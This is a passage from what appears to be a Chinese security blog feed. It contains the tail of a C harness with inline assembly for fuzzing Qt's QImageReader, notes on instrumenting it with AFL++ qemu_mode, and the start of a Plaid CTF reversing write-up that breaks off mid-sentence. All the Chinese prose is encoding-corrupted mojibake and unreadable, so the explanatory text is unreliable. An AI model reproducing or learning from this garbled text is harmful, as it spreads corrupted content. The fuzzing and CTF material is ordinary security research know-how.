__asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(qstring), <span class="hljs-string">&quot;S&quot;</span>(file_name), <span class="hljs-string">&quot;d&quot;</span>(<span class="hljs-built_in">strlen</span>(file_name)), <span class="hljs-string">&quot;a&quot;</span>(qt_qstring_fromlatin1)    );    <span class="hljs-comment">// QImageReader::setFileName(reader, qstring)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(qstring), <span class="hljs-string">&quot;a&quot;</span>(qt_setFileName)    );    <span class="hljs-comment">// QFile::exits(qfile) qfile = reader+0x10</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;test al, al\n&quot;</span>        <span class="hljs-string">&quot;je error\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_qfile_exits)    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;file exists&quot;</span>);    <span class="hljs-comment">// QImageReader::read(reader, qimage)</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;call rax\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;S&quot;</span>(image), <span class="hljs-string">&quot;a&quot;</span>(qt_qimageReader_read)    );        <span class="hljs-comment">// QFile::close()</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;mov rsi, [rdi]\n&quot;</span>        <span class="hljs-string">&quot;mov rdi, [rsi+0x10]\n&quot;</span>        <span class="hljs-string">&quot;call rax\n&quot;</span>        <span class="hljs-string">&quot;jmp out\n&quot;</span>        :        : <span class="hljs-string">&quot;D&quot;</span>(reader), <span class="hljs-string">&quot;a&quot;</span>(qt_close)    );    <span class="hljs-comment">// error:</span>    __asm__ __volatile__ (        <span class="hljs-string">&quot;error:\n&quot;</span>    );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;error: file not exists&quot;</span>);    <span class="hljs-comment">// popa</span>    __asm__ __volatile__(        <span class="hljs-string">&quot;out:\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r15\n&quot;</span>        <span class="hljs-string">&quot;pop r14\n&quot;</span>        <span class="hljs-string">&quot;pop r13\n&quot;</span>        <span class="hljs-string">&quot;pop r12\n&quot;</span>        <span class="hljs-string">&quot;pop r11\n&quot;</span>        <span class="hljs-string">&quot;pop r10\n&quot;</span>        <span class="hljs-string">&quot;pop r9\n&quot;</span>        <span class="hljs-string">&quot;pop r8\n&quot;</span>        <span class="hljs-string">&quot;pop rsi\n&quot;</span>        <span class="hljs-string">&quot;pop rdi\n&quot;</span>        <span class="hljs-string">&quot;pop rbp\n&quot;</span>        <span class="hljs-string">&quot;pop rdx\n&quot;</span>        <span class="hljs-string">&quot;pop rcx\n&quot;</span>        <span class="hljs-string">&quot;pop rbx\n&quot;</span>        <span class="hljs-string">&quot;pop rax\n&quot;</span>        );    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done&quot;</span>);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>è¿™ä¸ªåœ°æ–¹ï¼Œæœ€å¼€å§‹å†™çš„æ—¶å€™ï¼Œæ’¸äº†ä¸€ç‰ˆè·Ÿåä¸¤ç¯‡ä¸€æ ·çš„æ¥å£çš„ä»£ç ï¼Œä½†æ˜¯å‘ç°è¦†ç›–ç‡å¹¶æ²¡æœ‰ä¸Šå‡ï¼Œæœ€åè°ƒçš„æ—¶å€™ï¼Œå‘ç°åœ¨<code>reader.read()</code>çš„ç¬¬ä¸€æ¬¡åˆ¤æ–­æ”¯æŒçš„æ–‡ä»¶æ ¼å¼ï¼ˆ<code>bmp, png, jpg ...</code>ï¼‰ä»¥åŠæ–‡ä»¶æ˜¯å¦å­˜åœ¨æ—¶ï¼Œå°±å‘ç°ç¨‹åºè‡ªèº«å°±èµ°åˆ°äº†<code>File Not found</code>çš„åœ°æ–¹</p><p>æ— å¥ˆåªèƒ½é‡æ–°è°ƒè¯•ç¨‹åºï¼Œæœ€åæ‰¾åˆ°äº†ä¸€ä¸ª<code>QFile::exists()</code>æ¥å£ï¼Œè°ƒè¯•çš„æ—¶å€™ï¼Œå‘ç°<code>QFile</code>ä¸­å­˜å‚¨çš„è·¯å¾„çš„<code>QString</code>è·Ÿæˆ‘ç”¨<code>QString::QString()</code>çš„æ•°æ®ç»“æ„å¹¶ä¸ä¸€è‡´ï¼Œå°±æ¢äº†ä¸€ä¸ª<code>QString::fromLatin1()</code>æ¥å£ï¼Œå°±èƒ½æˆåŠŸåœ°è·‘èµ·æ¥äº†</p><h2 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h2><p>åœ¨å†™å¥½æ¿å­ä¹‹åå°±æƒ³è¦ç”¨<code>afl</code>çš„<code>qemu_mode</code>è¿›è¡Œæ’æ¡©<code>fuzz</code>ï¼ŒæŠ˜è…¾äº†åŠå¤©ï¼Œæ„Ÿè§‰<code>afl</code>åŸæœ¬çš„<code>qemu</code>ç‰ˆæœ¬ä»¥åŠ<code>patch</code>å’Œ<code>libc</code>çš„æ¥å£éƒ½å¤ªè€äº†</p><p>æœ€åå¬å­¦é•¿çš„ç›´æ¥æ•´<code>afl++</code>çš„<code>qemu_mode</code></p><p>æœ€åˆ<code>fuzz</code>èµ·æ¥çš„æ—¶å€™ï¼Œå¹¶æ²¡è¿‡å¤šçš„è®¾ç½®ï¼Œä½†æ˜¯è¿™æ ·çš„è¯æ˜¯å…¨æ’æ¡©ï¼Œåƒ<code>dlopen</code>çš„ä¸€äº›åº“éƒ½æ˜¯ä¸å…³å¿ƒä»¥åŠæ²¡å¿…è¦çš„ï¼Œè€Œä¸”åœ¨<code>afl++</code>çš„çª—å£ä¹Ÿçœ‹çš„å‡ºæ¥ï¼ŒåŸºæœ¬ä¸Šè¦†ç›–ç‡éƒ½æ˜¯ä¸ä¸Šå‡çš„ï¼Œè€Œä¸”æä½ï¼ˆ0.10%ï¼‰</p><p>åˆ©ç”¨<code>./afl-qemu-trace -D 1.txt -d exec,nochain ./qt_reader /tmp/1.png</code>è®°å½•ä¸‹æ¥<code>trace</code>ï¼Œå‘ç°ä¸åŒæ–‡ä»¶çš„<code>trace</code>å·®è·è¿˜æ˜¯å¾ˆæ˜æ˜¾çš„ï¼Œè¯´æ˜ä»£ç å¹¶æ²¡æœ‰å†™å´©</p><p>æœ€ååˆ©ç”¨<code>export AFL_INST_LIBS=1</code>ç»™åº“å‡½æ•°ä¹Ÿæ’æ¡©ä¹‹åå°±å¯ä»¥è·‘èµ·æ¥äº†</p><p>å¦å¤–ä¹Ÿå¯ä»¥é€šè¿‡<code>AFL_QEMU_INST_RANGES</code>è®¾ç½®<code>range</code>ï¼Œè¿›è¡ŒèŒƒå›´çš„æ’æ¡©ï¼Œé€šè¿‡ä»¥ä¸‹ä»£ç è·å–ç›¸å…³<code>.so</code>çš„å†…å­˜åœ°å€èŒƒå›´</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">lm</span> = (<span class="hljs-title">struct</span> <span class="hljs-title">link_map</span>*)<span class="hljs-title">handle</span>;</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;base:%p\n&quot;</span>, lm-&gt;l_addr);</code></pre><p>å¦å¤–ç¿»äº†ä¸€ä¸‹<code>afl</code>çš„æºç ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœ<code>cur_loc &gt;= afl_inst_rms</code>åˆ™<code>return</code>ï¼Œæ‰€ä»¥å¦‚æœç»™åº“æ’æ¡©è¿˜æ˜¯è¦æ³¨æ„æ˜¯å¦è¶…è¿‡äº†<code>MAP_SIZE</code>ï¼Œå¦åˆ™æœ€åçš„æ¯”è¾ƒå…³å¿ƒçš„<code>.so</code>æ²¡æ’æ¡©ä¸Š</p><pre><code class="hljs c"><span class="hljs-comment">/* Instrumentation ratio: */</span><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> afl_inst_rms = MAP_SIZE;<span class="hljs-comment">/* The equivalent of the tuple logging routine from afl-as.h. */</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afl_maybe_log</span><span class="hljs-params">(abi_ulong cur_loc)</span> </span>&#123;  <span class="hljs-keyword">static</span> __thread abi_ulong prev_loc;  <span class="hljs-comment">/* Optimize for cur_loc &gt; afl_end_code, which is the most likely case on</span><span class="hljs-comment">     Linux systems. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt; afl_end_code || cur_loc &lt; afl_start_code || !afl_area_ptr)    <span class="hljs-keyword">return</span>;  <span class="hljs-comment">/* Looks like QEMU always maps to fixed locations, so ASAN is not a</span><span class="hljs-comment">     concern. Phew. But instruction addresses may be aligned. Let&#x27;s mangle</span><span class="hljs-comment">     the value to get something quasi-uniform. */</span>  cur_loc  = (cur_loc &gt;&gt; <span class="hljs-number">4</span>) ^ (cur_loc &lt;&lt; <span class="hljs-number">8</span>);  cur_loc &amp;= MAP_SIZE - <span class="hljs-number">1</span>;  <span class="hljs-comment">/* Implement probabilistic instrumentation by looking at scrambled block</span><span class="hljs-comment">     address. This keeps the instrumented locations stable across runs. */</span>  <span class="hljs-keyword">if</span> (cur_loc &gt;= afl_inst_rms) <span class="hljs-keyword">return</span>;  afl_area_ptr[cur_loc ^ prev_loc]++;  prev_loc = cur_loc &gt;&gt; <span class="hljs-number">1</span>;&#125;</code></pre><h2 id="å…¶ä»–-è¸©å‘"><a href="#å…¶ä»–-è¸©å‘" class="headerlink" title="å…¶ä»– è¸©å‘"></a>å…¶ä»– <del>è¸©å‘</del></h2><h3 id="reader-setFileName"><a href="#reader-setFileName" class="headerlink" title="reader.setFileName"></a>reader.setFileName</h3><p>ä¸€å¼€å§‹æˆ‘æƒ³å»æ‰¾<code>houjingyi</code>å¸ˆå‚…æ˜¯å¦‚ä½•å¾—åˆ°<code>reader.setFileName</code>æ¥å£åœ¨<code>reader.read()</code>ä¹‹å‰è¢«è°ƒç”¨äº†çš„ï¼Œå› æ­¤æˆ‘å»å°è¯•è°ƒè¯•<code>linux</code>ä¸‹çš„<code>wpsoffice</code>æ‰“å¼€<code>docx</code>çš„æ“ä½œ</p><p>åœ¨<code>wpsoffice</code>æœ€åˆå¹¶æœªåŠ è½½<code>libQtCore.so.4.7.4</code>æ—¶ï¼Œç»™<code>pthread_create</code>ä¸‹æ–­ç‚¹ï¼Œ<code>continue</code>ä¹‹åå†ç»™<code>libQtCore.so.4.7.4</code>ä¸­çš„<code>QImageReader.read()</code>å’Œ<code>QImageReader.setFileName()</code>ä¸‹æ–­ç‚¹ï¼Œä½†æ˜¯å…¶å®æœ€åå¹¶æ²¡æœ‰å¾ˆæ˜æ˜¾çš„çœ‹å‡ºæ¥ï¼Œåœ¨è°ƒç”¨<code>reader.read()</code>ä¹‹å‰è°ƒç”¨äº†<code>reader.setFileName()</code></p><p>æœ€åå»è¯¢é—®<code>houjingyi</code>å¸ˆå‚…ï¼Œæ‰çŸ¥é“ï¼Œå¸ˆå‚…æ˜¯ç›´æ¥æ ¹æ®ç¨‹åºä»£ç é€»è¾‘ï¼Œè®¤ä¸º<code>reader.read()</code>ä¹‹å‰è‚¯å®šæœ‰å¯¹äºè®¾ç½®å›¾ç‰‡è·¯å¾„<code>reader.setFileName()</code>çš„æ“ä½œï¼ˆæ„Ÿè§‰è‡ªå·±çš„æ€ç»´æœ‰ç‚¹å±€é™äº†ï¼Œè€æ˜¯æƒ³æ˜æ˜ç™½ç™½è°ƒå‡ºæ¥è°ƒç”¨çš„æ¥å£å’Œé¡ºåºï¼Œå®é™…ä¸Šå…¨ç„¶æ²¡ç®¡å¼€å‘è€…åœ¨å¼€å‘æ—¶å€™çš„ä»£ç é€»è¾‘ï¼‰</p><p>P.S. è¯´èµ·æ¥ï¼Œè°ƒè¯• <code>wpsoffice</code> çš„ç¨‹åºçš„æ—¶å€™ï¼Œè§‰å¾—ç‰¹åˆ«ç¥å¥‡ï¼Œ<code>wpsoffice</code>ä¼šè¿è¡Œ<strong>ä¸¤æ¬¡</strong><code>_start</code>ï¼Œåœ¨ç¬¬ä¸€æ¬¡<code>_start</code>çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°<code>wpsoffice</code>åœ¨åŠ è½½è‡ªå·±çš„ç¨‹åºçš„çª—å£ï¼Œåœ¨ç¬¬ä¸€æ¬¡<code>_start</code>çš„æœ€åä¼š<code>jmp</code>ç¬¬äºŒæ¬¡çš„<code>_start</code>ï¼Œç¬¬äºŒæ¬¡çš„<code>wps</code>çª—å£ï¼Œæ˜¾ç¤ºæ­£åœ¨åŠ è½½<code>docx</code>æ–‡ä»¶ï¼Œå› æ­¤å½“æ—¶æˆ‘è°ƒè¯•çš„æ—¶å€™ï¼ŒçŒœæµ‹ç¬¬ä¸€æ¬¡<code>_start</code>çš„æ—¶å€™ï¼Œæ˜¯åœ¨åˆ©ç”¨<code>QtCore</code>åŠ è½½è‡ªå·±çª—å£ï¼Œè€Œç¬¬äºŒæ¬¡æ‰æ˜¯æ¸²æŸ“è§£æ<code>docx</code>æ–‡ä»¶ï¼Œä½†æ˜¯æœ€åè¿˜æ˜¯æ²¡è°ƒå‡ºæ¥</p><h3 id="QString-QString"><a href="#QString-QString" class="headerlink" title="QString::QString"></a>QString::QString</h3><p>è¿™ä¸ªæ¥å£è½¬æ¢å‡ºæ¥çš„å¹¶ä¸æ˜¯<code>QString</code>å‘äº†æˆ‘ä¸€æ®µæ—¶é—´ï¼Œæœ€åæ‰¾åˆ°<code>QFile::exists()</code>æ¥å£çš„æ—¶å€™ï¼Œæ‰å‘ç°ï¼Œ<code>QString::QString</code>è½¬æ¢å‡ºæ¥çš„ä¸æ˜¯<code>QString</code></p><h3 id="AFL-INST-LIBS-AFL-QEMU-INST-RANGES"><a href="#AFL-INST-LIBS-AFL-QEMU-INST-RANGES" class="headerlink" title="AFL_INST_LIBS AFL_QEMU_INST_RANGES"></a>AFL_INST_LIBS AFL_QEMU_INST_RANGES</h3><p>ä¸è®¾ç½®è¿™ä¸¤ä¸ªçš„è¯ï¼Œæ˜¯ä¸ä¼šç»™<code>dlopen</code>æ‰“å¼€çš„åº“å‡½æ•°æ’æ¡©çš„</p><h3 id="fuzz-æ–­æ‰ç»§ç»­è·‘"><a href="#fuzz-æ–­æ‰ç»§ç»­è·‘" class="headerlink" title="fuzz æ–­æ‰ç»§ç»­è·‘"></a>fuzz æ–­æ‰ç»§ç»­è·‘</h3><p>è®¾ç½®è¾“å…¥å‚æ•°ä¸º<code>-i-</code> ï¼Œå°±å¯ä»¥è¯»å…¥ <code>fuzz_out/default/_resume</code>ä¸­çš„å†…å®¹ï¼Œç»§ç»­è·‘</p><h3 id="å…¶ä»–é—®é¢˜"><a href="#å…¶ä»–é—®é¢˜" class="headerlink" title="å…¶ä»–é—®é¢˜"></a>å…¶ä»–é—®é¢˜</h3><p>é¡ºæ‰‹è¯•äº†ä¸€æ³¢<code>Qt5.12.9</code>ï¼Œæœ€åè·‘çš„æ—¶å€™ï¼Œæ˜¯å‡ºç°äº†<code>WARNING: Instrumentation output varies across runs.</code>ï¼Œå‘ç°æ˜¯å‡ºç°äº†<code>ASLR</code>çš„æƒ…å†µï¼Œç…§ç†æ¥è¯´<code>qemu</code>åº”è¯¥ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œä½†æ˜¯æ€ä¹ˆè§£å†³ï¼Œä¸å¤ªæ¸…æ¥š</p><h4 id="qasan"><a href="#qasan" class="headerlink" title="qasan"></a>qasan</h4><p><del>å¦å¤–è¯•äº†ä¸€ä¸‹<code>qasan</code>ä¹Ÿæ— æ³•è¿›è¡Œæ’æ¡©æ£€æµ‹ï¼Œæ„Ÿè§‰è¿˜å¾—å†æ•´æ•´</del></p><p><code>qasan</code>é‡æ–°è¯•äº†ä¸€ä¸‹ï¼Œæ²¡å•¥é—®é¢˜ï¼Œè‡³å°‘ä¹Ÿèƒ½è·‘èµ·æ¥ï¼Œå°±æ˜¯æ²¡å•¥æ•ˆæœï¼Œ<code>build.py</code>ä¹‹åï¼Œ<code>./qasan ./elffile arg...</code>å°±å¯ä»¥äº†</p><h4 id="e9afl"><a href="#e9afl" class="headerlink" title="e9afl"></a>e9afl</h4><p>è¯•äº†ä¸€ä¸‹<code>e9afl</code>ï¼Œä½†æ˜¯è§‰å¾—å¯¹äºè¿™ç§å†™çš„<code>harness</code>å¹¶ä¸æ€ä¹ˆå‹å¥½ï¼Œæœ€ç»ˆæ•ˆæœéå¸¸ä¸å¥½ï¼Œå¯¹äºåº“å‡½æ•°çš„æ’æ¡©ï¼Œåº”è¯¥æ˜¯æ’æ¡©æ‰€æœ‰å‡½æ•°ï¼Œæˆ–è€…æ²¿ç€æ¥å£çš„<code>CFG</code>éœ€è¦å¯¹ä¸»è¦éƒ¨åˆ†æ’æ¡©ï¼Œä½†æ˜¯æˆ‘åæ±‡ç¼–ï¼Œçœ‹çš„æ—¶å€™ï¼Œæ„Ÿè§‰åŸºæœ¬æ²¡æ’æ¡©ä»€ä¹ˆ</p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>afl++</tag>
      
      <tag>qemu_mode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Plaid CTF dr</title>
    <link href="/2021/05/10/Plaid%20CTF%20dr/"/>
    <url>/2021/05/10/Plaid%20CTF%20dr/</url>
    
    <content type="html"><![CDATA[<p>æ‰“æ¯”èµ›çš„æ—¶å€™ï¼Œåé¢ä¸€ç›´åœ¨çœ‹<code>dr</code>è¿™ä¸ªé¢˜ï¼ŒæŠŠå¤§æ¦‚é€»è¾‘é€†æ¸…æ¥šï¼ˆ<del>åæ¥å‘ç°é€†å‘ä¸€ç‚¹ç”¨éƒ½æ²¡ï¼Œæ„Ÿè§‰è¿˜ä¸å¦‚çŒœå‘¢ï¼Œtclï¼Œrusté€†çš„å¾ˆæ…¢</del>ï¼‰ï¼Œä¸€å¼€å§‹è§‰å¾—æœ‰ç‚¹ç±»ä¼¼è‡ªåŠ¨æœºï¼Œåé¢å‘ç°æ˜¯æ­£åˆ™ä¹‹åï¼Œå·¨ç¥ä¸¤ä¸ªå°æ—¶å°±ç§’äº†ï¼ˆtql</p><p>æ‹–äº†å¾ˆä¹…æ‰æ¥å¤ç°ï¼Œç¨å¾®è®°å½•ä¸€ä¸‹ï¼Œå…å¾—ä¹‹åå¿˜è®°äº†</p><h2 id="ç¨‹åºé€»è¾‘"><a href="#ç¨‹åºé€»è¾‘" class="headerlink" title="ç¨‹åºé€»è¾‘"></a>ç¨‹åºé€»è¾‘</h2><p> è™½ç„¶æ˜¯ rust å†™çš„ï¼Œä½†æ˜¯ç¨‹åºé€»è¾‘æ¯”è¾ƒç®€å•ï¼Œå¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œå‰é¢ç¬¬ä¸€éƒ¨åˆ†å’Œç¬¬ä¸‰éƒ¨åˆ†éƒ½æ˜¯å®šæ­»çš„å­—ç¬¦ä¸² â€œ3â€ å’Œ â€œyesâ€</p><p>ç¬¬äºŒéƒ¨åˆ†è¾“å…¥çš„æ—¶å€™ä¼šå‡ºç°ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿ï¼Œåˆ°åé¢å¯ä»¥å‘ç°ç¬¬äºŒéƒ¨åˆ†ç®—æ˜¯ç¬¬å››éƒ¨åˆ†çš„æç¤º</p><p>ç¬¬äºŒéƒ¨åˆ†è¾“å…¥çš„æ˜¯ç—‡çŠ¶ï¼Œç¬¬å››éƒ¨åˆ†æ˜¯è¾“å…¥keyï¼Œè¾“å…¥ç—‡çŠ¶æ—¶ï¼Œä¼šå‡ºç°ç±»ä¼¼è‡ªåŠ¨æœºåƒå­—ç¬¦ç„¶åå‡ºç°çŠ¶æ€è½¬æ¢çš„æç¤ºï¼Œåœ¨è¿™éƒ¨åˆ†å¯ä»¥çŒœåˆ°ä¸€äº›æœ€åŸºæœ¬çš„ç¬¦å·è¡¨ç¤ºï¼ŒåŒæ—¶ä¸åŒçš„ç—‡çŠ¶éœ€è¦çš„æ²»ç—…çš„è´¹ç”¨ä¸åŒï¼Œå¯¹åç»­çš„ç¬¬å››éƒ¨åˆ†ä¹Ÿä¼šé€ æˆå½±å“</p><p>ç¬¬å››éƒ¨åˆ†è¾“å…¥keyä¹‹åï¼Œä¼šè¿›è¡Œæ¥å—ï¼Œå¹¶åœ¨æœ€åå°†è¾“å…¥çš„å†…å®¹å’Œå†™åœ¨bssæ®µçš„å­—ç¬¦åˆ—è¡¨è¿›è¡Œå¤„ç†ä¹‹åå¾—åˆ°flag</p><h2 id="æ­£åˆ™åˆ†æ"><a href="#æ­£åˆ™åˆ†æ" class="headerlink" title="æ­£åˆ™åˆ†æ"></a>æ­£åˆ™åˆ†æ</h2><p>é€šè¿‡çŒœåå­—å’Œå¯¹äºä¸åŒçš„è¾“å…¥å’Œæç¤ºçš„è¿”å›å¯ä»¥å¾—åˆ°ä»¥ä¸‹çš„åˆ†æç»“æœ</p><pre><code class="hljs"><span class="hljs-attribute">And</span>: æ»¡è¶³Resä¸­æ‰€æœ‰çš„è¦æ±‚<span class="hljs-attribute">Alt</span>: æ»¡è¶³Resä¸­å…¶ä¸­ä¸€ä¸ªè¦æ±‚<span class="hljs-attribute">Seq</span>: æ­£åˆ™éœ€è¦æ»¡è¶³çš„åºåˆ—<span class="hljs-attribute">Lit</span>: ä¸€ä¸ªä¸€ä¸ªåŒ¹é…ï¼Œå­—é¢é‡<span class="hljs-attribute">Res</span>: æ•°ç»„<span class="hljs-attribute">Star</span>: åŒ¹é…0ä¸ªæˆ–è€…å¤šä¸ª<span class="hljs-attribute">Eps</span>: epsilon<span class="hljs-attribute">Neg(Null)</span>: åŒ¹é…ä»»æ„é•¿åº¦çš„<span class="hljs-attribute">Neg:</span>    10c -&gt; 10ca    Neg( ... Alt(Res([Lit(&quot;af&quot;)])) ...) -&gt; Neg( ... Alt(Res([Lit(&quot;f&quot;)])) ... )    åº”è¯¥æ˜¯ç¦æ­¢å‡ºç° af çš„æ„æ€        å°è¯• 10caf ä¹Ÿå¤±æ•ˆäº†<span class="hljs-attribute">Consider</span>:     1: 1,7777,73331         0*16+1    10: 16,7777,73331       (0*16+1)*16+0        100: 256,7777,73331     ((0*16+1)*16+0)*16+0    10c: 268,7777,73331     ((0*16+1)*16+0)*16+0xc    %733331    ç›¸å½“äº Consider(Res([])) çš„ä¸ªæ•°è¿›åˆ¶<span class="hljs-attribute">Moon</span>:     1: Moon([0-9],2,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10: Moon([0-9],3,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    100: Moon([0-9],1,3), Moon([a-f],2,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)    10c: Moon([a-f],3,3), Moon( (([0-9],1,3), ([a-f],2,3)), 1, 2)        ç›¸å½“äºåœ¨ç®—ä¸ªæ•°ï¼Œå¦‚æœä¸ªæ•°ç›¸ç­‰äº†ï¼Œè¿™ä¸ª Moon å¯ä»¥ç»“æŸè¿›å…¥ä¸‹ä¸€ä¸ª    100c è¿™ä¸ªcå°±åƒä¸è¿›å»ï¼Œå› ä¸ºç¬¬ä¸€é¡¹æ˜¯ Moon([0-9], 1, 3)<span class="hljs-attribute">Fan:</span>    10: Neg(.. Fan([a-f], 6) ..)    10b: Neg(.. Fan([a-f], 5) ..)    å€’æ•°è®¡æ•°</code></pre><h2 id="æ¡ä»¶"><a href="#æ¡ä»¶" class="headerlink" title="æ¡ä»¶"></a>æ¡ä»¶</h2><p>æœ€åå¯¹ç…§è¾“å…¥<code>1</code>ä¹‹åçš„æ­£åˆ™æç¤ºï¼Œå¯ä»¥åˆ†æå¾—åˆ°ä»¥ä¸‹çš„ç»“æœ</p><pre><code class="hljs lsl"><span class="hljs-number">1.</span> Neg(Null) + Consider( [bcd], Lit(<span class="hljs-string">&quot;cdb&quot;</span>)+Neg(bd) ], <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)  å­—ç¬¦ä¸² []cdb æˆ–è€… cdb[] ä¸”ä¸èƒ½ä¸º cdbb cdbd<span class="hljs-number">2.</span> *[<span class="hljs-number">1</span><span class="hljs-number">-3</span>] + (*[<span class="hljs-number">3</span><span class="hljs-number">-7</span>] + Neg(Null))                                <span class="hljs-number">3.</span> Consider( [<span class="hljs-number">05</span>a], [<span class="hljs-number">16</span>b], [<span class="hljs-number">27</span>cf], [<span class="hljs-number">38</span>dx], [<span class="hljs-number">49</span>e], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span> )     ç®—æ³•éœ€è¦ æœ€å %<span class="hljs-number">7</span> == <span class="hljs-number">0</span><span class="hljs-number">4.</span> Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>) + Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>) + Moon( Moon([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">1</span>, <span class="hljs-number">3</span>), Moon([a-f], <span class="hljs-number">2</span>, <span class="hljs-number">3</span>), <span class="hljs-number">1</span>, <span class="hljs-number">2</span>)    éœ€è¦ æ•°å­—(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+å­—ç¬¦(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..)+æ•°å­—(<span class="hljs-number">2</span> <span class="hljs-number">5</span> <span class="hljs-number">8.</span>..)+å­—ç¬¦(<span class="hljs-number">1</span> <span class="hljs-number">4</span> <span class="hljs-number">7.</span>..) <span class="hljs-number">5.</span> Moon(Lit(<span class="hljs-string">&quot;10&quot;</span>), <span class="hljs-number">0</span>, <span class="hljs-number">3</span>)                                        <span class="hljs-number">10</span>éœ€è¦å‡ºç°<span class="hljs-number">3</span>æ¬¡<span class="hljs-number">6.</span> Neg( Alt( Lit(<span class="hljs-string">&quot;af&quot;</span>), Lit(<span class="hljs-string">&quot;73&quot;</span>), æ•°å­—+Lit(<span class="hljs-string">&quot;a&quot;</span>), Lit(<span class="hljs-string">&quot;ccc&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">7</span>) )  )          af <span class="hljs-number">73</span> æ•°å­—+a ccc éƒ½ä¸èƒ½å‡ºç° æ•°å­—ä¹Ÿä¸èƒ½è¿ç»­è¶…è¿‡<span class="hljs-number">7</span>ä¸ª   Neg( Alt( Lit(<span class="hljs-string">&quot;a&quot;</span>), Fan([<span class="hljs-number">0</span><span class="hljs-number">-9</span>], <span class="hljs-number">6</span>)))                   a ä¸èƒ½å‡ºç° æ•°å­—ä¸èƒ½è¿ç»­è¶…è¿‡<span class="hljs-number">6</span>ä¸ª<span class="hljs-number">7.</span> Neg( Neg(Null) + Fan([a-f]+Neg(Null), <span class="hljs-number">6</span>))                                    å­—æ¯ä¸èƒ½è¶…è¿‡<span class="hljs-number">6</span>ä¸ª<span class="hljs-number">8.</span> Consider(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,a,b,c,d,e,f, <span class="hljs-number">0</span>,<span class="hljs-number">7777</span>,<span class="hljs-number">73331</span>)</code></pre><h2 id="å¤§è‡´æ¨æµ‹"><a href="#å¤§è‡´æ¨æµ‹" class="headerlink" title="å¤§è‡´æ¨æµ‹"></a>å¤§è‡´æ¨æµ‹</h2><p>1 4 7å¾— <code>cdb</code> çš„ä¸²é•¿åº¦åªèƒ½ä¸º 4ä¸”åªèƒ½ä¸º <code>[b-f]cdb | cdb[cef]</code></p><p>ä¸»è¦4å¯ä»¥çŸ¥é“åŸºæœ¬ä¸Šæ˜¯<code>æ•°å­—+å­—ç¬¦+æ•°å­—+å­—ç¬¦</code>çš„æ¨¡å¼ï¼Œåˆå­—ç¬¦ä¸èƒ½è¶…è¿‡6ä¸ªä¸”è¿ç»­çš„å­—ç¬¦å¿…é¡»æ˜¯1æˆ–è€…4ä¸ªï¼Œå› æ­¤è¦ä¹ˆæ˜¯<code>1+4</code>è¦ä¹ˆæ˜¯<code>4+1</code></p><p>å†åˆ¤æ–­ä¸€ä¸‹æ•°å­—åªèƒ½æ˜¯<code>2+2 | 2+5 | 5+2 | 5+5</code>ï¼Œåˆéœ€è¦å‡ºç°ä¸‰æ¬¡<code>10</code>ï¼Œå› æ­¤åªèƒ½<code>[1010x|10x10|10] + [10xxx|x10xx|xx10x|xxx10]</code>æˆ–è€…è¿™ä¸¤ä¸ªçš„é¡ºåºå¯ä»¥åè¿‡æ¥å³å‰é¢æ˜¯ä¸€ä¸ª<code>10</code>åé¢æ˜¯ä¸¤ä¸ª<code>10</code></p><p> å› æ­¤<code>(a, b, c, 